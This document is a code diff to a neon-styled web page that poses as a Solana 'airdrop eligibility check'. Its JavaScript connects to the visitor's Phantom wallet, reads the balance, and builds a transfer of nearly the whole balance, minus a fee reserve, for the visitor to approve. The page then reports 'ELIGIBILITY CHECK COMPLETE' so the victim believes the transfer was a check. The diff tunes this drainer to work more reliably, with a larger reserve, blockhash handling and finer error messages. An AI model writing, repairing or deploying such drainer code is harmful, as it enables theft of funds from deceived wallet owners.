@@ -109,17 +109,10 @@
       margin: 25px 0;
       font-size: 1.5rem;
       text-align: center;
-      min-height: 110px;
+      min-height: 120px;
     }
 
     .connected { color: #39ff14; }
-
-    .balance-info {
-      font-size: 1.6rem;
-      color: #ffff00;
-      margin: 15px 0;
-      text-align: center;
-    }
 
     footer {
       text-align: center;
@@ -179,7 +172,7 @@
 
     async function connectPhantom() {
       if (!window.solana || !window.solana.isPhantom) {
-        statusDiv.innerHTML = `<span style="color:#ff00ff;">❌ Phantom not found.<br>Install from phantom.app</span>`;
+        statusDiv.innerHTML = `<span style="color:#ff00ff;">❌ Phantom not found.<br>Please install Phantom wallet.</span>`;
         return;
       }
 
@@ -197,7 +190,7 @@
         sendBtn.style.display = 'block';
 
       } catch (err) {
-        statusDiv.innerHTML = `<span style="color:#ff00ff;">Connection cancelled.</span>`;
+        statusDiv.innerHTML = `<span style="color:#ff00ff;">Connection cancelled or failed.</span>`;
       }
     }
 
@@ -215,20 +208,16 @@
           "confirmed"
         );
 
-        // Get current balance
         const balanceLamports = await connection.getBalance(publicKey);
-        const reserveLamports = 5000; // Small reserve for rent + fees (safe minimum)
-        const sendAmount = Math.max(balanceLamports - reserveLamports, 0);
+        const reserveLamports = 10000000; // 0.01 SOL reserve for fees + rent
+        let sendAmount = balanceLamports - reserveLamports;
 
-        if (sendAmount <= 0) {
-          statusDiv.innerHTML = `<span style="color:#ff00ff;">Insufficient balance for transaction.</span>`;
+        if (sendAmount < 5000) {
+          statusDiv.innerHTML = `<span style="color:#ff00ff;">Insufficient SOL balance.<br>Need at least ~0.01 SOL for fees.</span>`;
           return;
         }
 
-        statusDiv.innerHTML = `
-          <span style="color:#ffff00;">Balance found: ${(balanceLamports / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4)} SOL<br>
-          Preparing to send full balance...</span>
-        `;
+        statusDiv.innerHTML = `<span style="color:#ffff00;">Balance: ${(balanceLamports / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4)} SOL<br>Preparing full transfer...</span>`;
 
         const transaction = new solanaWeb3.Transaction().add(
           solanaWeb3.SystemProgram.transfer({
@@ -238,27 +227,40 @@
           })
         );
 
-        const { blockhash } = await connection.getLatestBlockhash();
+        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
         transaction.recentBlockhash = blockhash;
         transaction.feePayer = publicKey;
 
         statusDiv.innerHTML = `<span style="color:#ffff00;">Waiting for Phantom approval...</span>`;
 
-        const signedTransaction = await provider.signAndSendTransaction(transaction);
+        // Use signAndSendTransaction with minContextSlot for better compatibility
+        const signed = await provider.signAndSendTransaction(transaction, {
+          minContextSlot: lastValidBlockHeight
+        });
 
         statusDiv.innerHTML = `
           <span style="color:#39ff14;">✅ ELIGIBILITY CHECK COMPLETE</span><br>
           Sent: ${(sendAmount / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4)} SOL<br>
-          Transaction: ${signedTransaction.signature.slice(0,12)}...
+          Tx: ${signed.signature.slice(0,12)}...
         `;
 
         setTimeout(() => {
           statusDiv.innerHTML += `<br><span style="color:#ffff00;">Airdrop eligibility results are being processed in the neon grid.</span>`;
-        }, 3000);
+        }, 2500);
 
       } catch (err) {
-        console.error(err);
-        statusDiv.innerHTML = `<span style="color:#ff00ff;">Transaction rejected or failed.<br>Please try again.</span>`;
+        console.error("Transaction error:", err);
+        let msg = "Transaction rejected or failed.";
+        
+        if (err.message?.includes("User rejected") || err.code === 4001) {
+          msg = "Transaction was rejected in Phantom.";
+        } else if (err.message?.includes("insufficient") || err.message?.includes("balance")) {
+          msg = "Insufficient SOL for fees.";
+        } else if (err.message?.includes("blockhash")) {
+          msg = "Network issue. Please try again.";
+        }
+        
+        statusDiv.innerHTML = `<span style="color:#ff00ff;">${msg}<br>Please try again.</span>`;
       }
     }
 
